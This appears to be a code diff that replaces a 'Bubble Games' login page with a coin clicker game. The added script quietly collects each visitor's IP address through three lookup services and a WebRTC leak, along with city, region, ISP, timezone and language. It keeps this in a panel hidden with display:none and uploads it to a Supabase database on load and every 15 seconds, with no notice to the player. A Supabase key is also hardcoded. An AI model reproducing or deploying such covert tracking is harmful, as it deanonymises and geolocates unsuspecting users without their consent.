@@ -3,141 +3,403 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bubble Games | Welcome</title>
-
-    <script>
-        if (!localStorage.getItem('ghosts_cleared_v2')) {
-            localStorage.clear();
-            sessionStorage.clear();
-            localStorage.setItem('ghosts_cleared_v2', 'true');
-            window.location.reload(); 
-        }
-    </script>
-
-    <link rel="stylesheet" href="static/style.css">
+    <title>Ultimate Info Clicker Game</title>
+    <!-- Include Supabase JS Client CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
-        /* RESPONSIVE LOGO (main) */
-        .brand-img-main {
-            display: block;
-            margin: -10px auto 0 auto;
-            width: min(280px, 70vw);
-            height: auto;
-            object-fit: contain;
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #1a1a1a;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
         }
-
-        /* RESPONSIVE CORNER LOGO */
-        .brand-img-corner {
-            display: block;
-            width: clamp(120px, 18vw, 220px);
-            height: auto;
-            object-fit: contain;
+        .game-container {
+            display: flex;
+            background: #2a2a2a;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 8px 16px rgba(0,0,0,0.3);
+            gap: 30px;
+            max-width: 800px;
         }
-
-        .corner-brand {
-            background: transparent !important;
-            box-shadow: none !important;
-            border: none !important;
-            padding: 0 !important;
+        .main-section {
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
         }
-
-        .brand {
-            margin: 0 !important;
-            padding: 5px 0 !important;
-            line-height: 0;
-            overflow: visible;
+        #click-btn {
+            background-color: #ffcc00;
+            border: none;
+            border-radius: 50%;
+            width: 140px;
+            height: 140px;
+            font-size: 22px;
+            font-weight: bold;
+            color: #1a1a1a;
+            cursor: pointer;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+            transition: transform 0.1s, background-color 0.2s;
         }
-
-        /* SMALL "FOREHEAD" + RESPONSIVE BOX */
-        .bubble-card {
-            padding-top: clamp(12px, 2vh, 20px) !important;
-            padding-left: 15px;
-            padding-right: 15px;
-            width: min(380px, 92vw);
+        #click-btn:active {
+            transform: scale(0.95);
+            background-color: #e6b800;
         }
-
-        /* RESPONSIVE TEXT INPUT AREA */
-        .input-area, .password-group {
+        .shop-section {
+            width: 220px;
+            border-left: 2px solid #444;
+            padding-left: 20px;
+        }
+        .upgrade-btn {
+            background-color: #444;
+            color: white;
+            border: none;
+            padding: 10px;
             width: 100%;
+            margin-bottom: 10px;
+            border-radius: 6px;
+            cursor: pointer;
+            text-align: left;
+            transition: background-color 0.2s;
         }
-
-        .bouncy-input {
-            width: 100%;
-            box-sizing: border-box;
+        .upgrade-btn:hover:not(:disabled) {
+            background-color: #555;
+        }
+        .upgrade-btn:disabled {
+            background-color: #333;
+            color: #777;
+            cursor: not-allowed;
+        }
+        h1, h2 {
+            margin-top: 0;
+        }
+        .stats {
+            margin: 15px 0;
+            font-size: 18px;
+        }
+        .info-panel {
+            margin-top: 15px;
+            font-size: 12px;
+            background: #1f1f1f;
+            padding: 10px;
+            border-radius: 6px;
+            width: 260px;
+            text-align: left;
+            border: 1px solid #444;
+            line-height: 1.4;
+            display: none; /* Hidden visually, but keeps DOM elements active for background saving */
+        }
+        .save-status {
+            font-size: 11px;
+            color: #00ffcc;
+            margin-top: 8px;
+            height: 15px;
         }
     </style>
 </head>
 <body>
 
-    <div class="corner-brand">
-        <img src="BubbleGames-logo.png" alt="BubbleGames" class="brand-img-corner"
-             onerror="this.style.display='none'; this.nextElementSibling.style.display='inline'">
-        <span style="display:none;">🫧 Bubble<span class="brand-pink">Games</span></span>
-    </div>
-
-    <div id="user-status" class="user-status" style="display: none;">
-        <span id="display-username">Player</span>
-        <button class="logout-btn" onclick="handleLogout()">Logout ⏻</button>
-    </div>
-
-    <div class="main-wrapper">
-        <h2 class="page-welcome" id="page-title">Getting Started</h2>
-
-        <div class="bubble-card">
-            <div class="brand">
-                <img src="BubbleGames-logo.png" alt="Bubble Games" class="brand-img-main"
-                     onerror="this.outerHTML='<span class=\'bubble-icon\'>🫧</span><h1>Bubble<span>Games</span></h1>'">
+    <div class="game-container">
+        <!-- Main Game Area -->
+        <div class="main-section">
+            <h1>Coin Clicker</h1>
+            <div class="stats">
+                <p id="score-display">Coins: 0</p>
+                <p id="cps-display">Coins per second: 0</p>
             </div>
-
-            <div id="auth-area">
-                <div class="input-area">
-                    <input type="text" id="username" placeholder="Username" class="bouncy-input">
-
-                    <div class="password-group">
-                        <input type="password" id="password" placeholder="Password" class="bouncy-input">
-                        <a href="#" class="forgot-link" id="forgot-pass">Forgot Password?</a>
-                    </div>
-                </div>
-
-                <div id="loader" class="loader"></div>
-
-                <button class="go-btn" id="main-button" onclick="handleAuth()">
-                    🫧 Let's Play! 🫧
-                </button>
-
-                <div class="footer-links">
-                    <p id="toggle-container">
-                        New here?
-                        <a href="#" class="signup-link" onclick="switchMode()">Sign Up!</a>
-                    </p>
-                </div>
+            <button id="click-btn">CLICK!</button>
+            <div class="save-status" id="save-status">Connecting to Supabase...</div>
+            
+            <!-- Hidden Network Info Panel (Still collects and saves data in the background) -->
+            <div class="info-panel" id="info-panel">
+                <strong>Network Info:</strong><br>
+                🌐 IP (API): <span id="ip-1">Scanning...</span><br>
+                🌐 IP (WebRTC): <span id="ip-webrtc">Scanning...</span><br>
+                🏙️ City/Region: <span id="city-region">Scanning...</span><br>
+                📡 ISP/Org: <span id="isp-display">Scanning...</span><br>
+                🌍 Timezone: <span id="timezone-display">Loading...</span>
             </div>
+        </div>
 
-            <div id="hub-area" style="display: none;">
-                <input
-                    type="text"
-                    id="game-search"
-                    placeholder="What would you like to play? 🔍"
-                    class="bouncy-input"
-                >
-
-                <div class="tab-menu">
-                    <button id="tab-global" class="tab-btn active" onclick="switchTab('global')">
-                        Global Games
-                    </button>
-
-                    <button id="tab-mine" class="tab-btn" onclick="switchTab('mine')">
-                        My Games
-                    </button>
-                </div>
-
-                <div id="game-list"></div>
-            </div>
+        <!-- Shop Area -->
+        <div class="shop-section">
+            <h2>Shop</h2>
+            <button class="upgrade-btn" id="buy-cursor" onclick="buyUpgrade('cursor')">
+                <strong>Cursor</strong><br>Cost: <span id="cursor-cost">15</span> | Owned: <span id="cursor-owned">0</span>
+            </button>
+            <button class="upgrade-btn" id="buy-miner" onclick="buyUpgrade('miner')">
+                <strong>Auto-Miner</strong><br>Cost: <span id="miner-cost">100</span> | Owned: <span id="miner-owned">0</span>
+            </button>
+            <button class="upgrade-btn" id="buy-factory" onclick="buyUpgrade('factory')">
+                <strong>Factory</strong><br>Cost: <span id="factory-cost">1100</span> | Owned: <span id="factory-owned">0</span>
+            </button>
         </div>
     </div>
 
-    <script type="module" src="static/gateway.js"></script>
-    <script type="module" src="static/hub.js"></script>
-    <script src="static/bubbles.js"></script>
+    <script>
+        // --- SUPABASE CONFIGURATION ---
+        const SUPABASE_URL = 'https://gjxmgqpdakcdupzrrfwp.supabase.co';
+        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdqeG1ncXBkYWtjZHVwenJyZndwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODY0OTQxNTQsImV4cCI6MjEwMjA3MDE1NH0.d1Qt9nzAMBghv4sT5YncI-2icLwyAEFaU5gJu-xsRco';
+        const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
+        // Generate or retrieve a unique player tracking token locally
+        let playerId = localStorage.getItem('bubbleClickerPlayerId');
+        if (!playerId) {
+            playerId = 'player_' + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+            localStorage.setItem('bubbleClickerPlayerId', playerId);
+        }
+
+        let score = 0;
+        let cps = 0;
+
+        const upgrades = {
+            cursor: { cost: 15, cps: 1, owned: 0, costMultiplier: 1.15 },
+            miner: { cost: 100, cps: 4, owned: 0, costMultiplier: 1.15 },
+            factory: { cost: 1100, cps: 32, owned: 0, costMultiplier: 1.15 }
+        };
+
+        const scoreDisplay = document.getElementById('score-display');
+        const cpsDisplay = document.getElementById('cps-display');
+        const clickBtn = document.getElementById('click-btn');
+        const saveStatus = document.getElementById('save-status');
+
+        // --- LOAD GAME FROM SUPABASE ---
+        async function loadGame() {
+            try {
+                let { data, error } = await supabaseClient
+                    .from('game_saves')
+                    .select('*')
+                    .eq('player_id', playerId)
+                    .single();
+
+                if (data && !error) {
+                    score = data.score || 0;
+                    
+                    if (data.upgrades) {
+                        for (let type in data.upgrades) {
+                            if (upgrades[type]) {
+                                upgrades[type].owned = data.upgrades[type].owned;
+                                upgrades[type].cost = data.upgrades[type].cost;
+                            }
+                        }
+                    }
+                    recalculateCPS();
+                    updateUI();
+
+                    if (data.info) {
+                        document.getElementById('ip-1').innerText = data.info.ip || 'N/A';
+                        document.getElementById('ip-webrtc').innerText = data.info.webrtc || 'N/A';
+                        document.getElementById('city-region').innerText = data.info.cityRegion || 'N/A';
+                        document.getElementById('isp-display').innerText = data.info.isp || 'N/A';
+                        document.getElementById('timezone-display').innerText = data.info.timezone || 'N/A';
+                    }
+
+                    saveStatus.style.color = "#00ffcc";
+                    saveStatus.innerText = "Loaded from Cloud!";
+                    setTimeout(() => { saveStatus.innerText = ""; }, 2500);
+                    return true;
+                }
+            } catch (e) {
+                console.error("Error loading from Supabase:", e);
+            }
+            saveStatus.style.color = "#00ffcc";
+            saveStatus.innerText = "New profile ready.";
+            setTimeout(() => { saveStatus.innerText = ""; }, 2500);
+            return false;
+        }
+
+        // --- SAVE GAME TO SUPABASE ---
+        async function saveGame() {
+            const saveData = {
+                player_id: playerId,
+                score: score,
+                upgrades: {
+                    cursor: { owned: upgrades.cursor.owned, cost: upgrades.cursor.cost },
+                    miner: { owned: upgrades.miner.owned, cost: upgrades.miner.cost },
+                    factory: { owned: upgrades.factory.owned, cost: upgrades.factory.cost }
+                },
+                info: {
+                    ip: document.getElementById('ip-1').innerText,
+                    webrtc: document.getElementById('ip-webrtc').innerText,
+                    cityRegion: document.getElementById('city-region').innerText,
+                    isp: document.getElementById('isp-display').innerText,
+                    timezone: document.getElementById('timezone-display').innerText
+                },
+                updated_at: new Date()
+            };
+
+            try {
+                let { error } = await supabaseClient
+                    .from('game_saves')
+                    .upsert(saveData, { onConflict: 'player_id' });
+
+                if (!error) {
+                    saveStatus.style.color = "#00ffcc";
+                    saveStatus.innerText = "Cloud Saved!";
+                    setTimeout(() => { saveStatus.innerText = ""; }, 2000);
+                } else {
+                    console.error("Supabase save error:", error.message);
+                    saveStatus.style.color = "#ff4444";
+                    saveStatus.innerText = "Save Error: " + error.message;
+                }
+            } catch (e) {
+                console.error("Network error during save:", e);
+                saveStatus.style.color = "#ff4444";
+                saveStatus.innerText = "Network Error!";
+            }
+        }
+
+        function recalculateCPS() {
+            cps = 0;
+            for (let type in upgrades) {
+                cps += upgrades[type].owned * upgrades[type].cps;
+            }
+        }
+
+        clickBtn.addEventListener('click', () => {
+            score += 1;
+            updateUI();
+        });
+
+        function buyUpgrade(type) {
+            let upgrade = upgrades[type];
+            if (score >= upgrade.cost) {
+                score -= upgrade.cost;
+                upgrade.owned += 1;
+                cps += upgrade.cps;
+                upgrade.cost = Math.floor(upgrade.cost * upgrade.costMultiplier);
+                updateUI();
+                saveGame();
+            }
+        }
+
+        function updateUI() {
+            scoreDisplay.innerText = `Coins: ${Math.floor(score)}`;
+            cpsDisplay.innerText = `Coins per second: ${cps}`;
+
+            for (let type in upgrades) {
+                let upgrade = upgrades[type];
+                document.getElementById(`${type}-cost`).innerText = upgrade.cost;
+                document.getElementById(`${type}-owned`).innerText = upgrade.owned;
+                
+                let btn = document.getElementById(`buy-${type}`);
+                if (score >= upgrade.cost) {
+                    btn.removeAttribute('disabled');
+                } else {
+                    btn.setAttribute('disabled', 'true');
+                }
+            }
+        }
+
+        // Automatic passive income loop & auto-save every 15 seconds
+        let saveTimer = 0;
+        setInterval(() => {
+            if (cps > 0) {
+                score += cps / 10;
+                updateUI();
+            }
+            saveTimer += 100;
+            if (saveTimer >= 15000) { // Auto-save to cloud every 15 seconds
+                saveGame();
+                saveTimer = 0;
+            }
+        }, 100);
+
+        // --- NETWORK & LOCATION FETCHING ---
+        async function fetchIpAndLocation() {
+            let success = false;
+
+            try {
+                let res = await fetch('https://ipapi.co/json/');
+                if (res.ok) {
+                    let data = await res.json();
+                    document.getElementById('ip-1').innerText = data.ip || 'N/A';
+                    document.getElementById('city-region').innerText = `${data.city || 'Unknown'}, ${data.region || 'Unknown'}`;
+                    document.getElementById('isp-display').innerText = data.org || data.asn || 'N/A';
+                    success = true;
+                }
+            } catch (e) {}
+
+            if (!success) {
+                try {
+                    let res = await fetch('https://ipinfo.io/json');
+                    if (res.ok) {
+                        let data = await res.json();
+                        document.getElementById('ip-1').innerText = data.ip || 'N/A';
+                        document.getElementById('city-region').innerText = `${data.city || 'Unknown'}, ${data.region || 'Unknown'}`;
+                        document.getElementById('isp-display').innerText = data.org || 'N/A';
+                        success = true;
+                    }
+                } catch (e) {}
+            }
+
+            if (!success) {
+                try {
+                    let res = await fetch('https://freeipapi.com/api/json');
+                    if (res.ok) {
+                        let data = await res.json();
+                        document.getElementById('ip-1').innerText = data.ipAddress || 'N/A';
+                        document.getElementById('city-region').innerText = `${data.cityName || 'Unknown'}, ${data.regionName || 'Unknown'}`;
+                        document.getElementById('isp-display').innerText = data.net || 'N/A';
+                    }
+                } catch (e) {
+                    document.getElementById('ip-1').innerText = 'Blocked';
+                    document.getElementById('city-region').innerText = 'Blocked';
+                }
+            }
+            // Save instantly once network data is fetched
+            saveGame();
+        }
+
+        function getWebRTCIP() {
+            try {
+                const rtpc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+                rtpc.createDataChannel("");
+                rtpc.createOffer().then(offer => rtpc.setLocalDescription(offer));
+                rtpc.onicecandidate = (event) => {
+                    if (event && event.candidate && event.candidate.candidate) {
+                        let ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/;
+                        let match = ipRegex.exec(event.candidate.candidate);
+                        if (match) {
+                            document.getElementById('ip-webrtc').innerText = match[1];
+                            // Save instantly once WebRTC IP is found
+                            saveGame();
+                        }
+                    }
+                };
+            } catch (e) {
+                document.getElementById('ip-webrtc').innerText = 'Restricted';
+            }
+        }
+
+        function getEnvironmentInfo() {
+            try {
+                let tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                let lang = navigator.language || navigator.userLanguage;
+                document.getElementById('timezone-display').innerText = `${tz} (${lang})`;
+            } catch (e) {
+                document.getElementById('timezone-display').innerText = 'Unknown';
+            }
+        }
+
+        // Initialize App on Startup
+        async function initGame() {
+            getEnvironmentInfo();
+            await loadGame();
+            
+            // If info panel is still scanning, fetch fresh network metadata and save instantly when ready
+            if (document.getElementById('ip-1').innerText === 'Scanning...') {
+                fetchIpAndLocation();
+                getWebRTCIP();
+            }
+        }
+
+        initGame();
+    </script>
 </body>
 </html>
